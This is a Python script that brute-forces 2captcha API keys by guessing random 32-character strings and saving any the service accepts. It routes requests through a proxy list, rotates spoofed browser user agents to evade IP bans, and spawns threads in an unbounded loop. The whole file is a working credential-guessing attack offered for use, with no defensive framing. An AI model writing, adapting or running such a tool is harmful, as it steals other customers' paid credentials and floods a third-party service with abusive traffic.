import httpx, random, string, time, threading, ctypes, os, sys

counter = [0,0,0,0,0]
proxfile1 = 'http.txt'
uas=['Mozilla/5.0 (X11; CrOS x86_64 14588.123.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.72 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.4; rv:101.0) Gecko/20100101 Firefox/101.0', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36']

counter = 0
def gen(length):
    letters_and_digits = string.ascii_letters + string.digits
    result_str = ''.join((random.choice(letters_and_digits) for i in range(length)))
    return result_str
def check():
  key = gen(32)
  id = random.randint(1,100000)
  url = f'http://2captcha.com/res.php?key={key}&action=get&id={id}'
  try:
    with httpx.Client(http2=True,proxies='http://'+random.choice(list(map(lambda x:x.strip(),open(proxfile1)))),headers = {'accept-language': 'en','user-agent':random.choice(uas)},follow_redirects=True) as client:
      r = client.get(url)
      if "ERROR_KEY_DOES_NOT_EXIST" in r.text:
        print(f'invalid : {key}',"ERROR_KEY_DOES_NOT_EXIST")
      elif "IP_BANNED" in r.text:
        print(f'invalid : {key}',"IP_BANNED")
      elif "price" in r.text:
        print(f'valid : {key}', r.text)
        f = open('valid.txt','a+')
        f.write(f'{key}\n')
      else:
        pass
  except:
    pass
if __name__ == "__main__":
  Threads = []
  while 1:
    t = threading.Thread(target=check)
    t.start()
    Threads.append(t)
  for i in Threads:
    i.join()
print('Done')
time.sleep(5)
input('enter to exit')





  
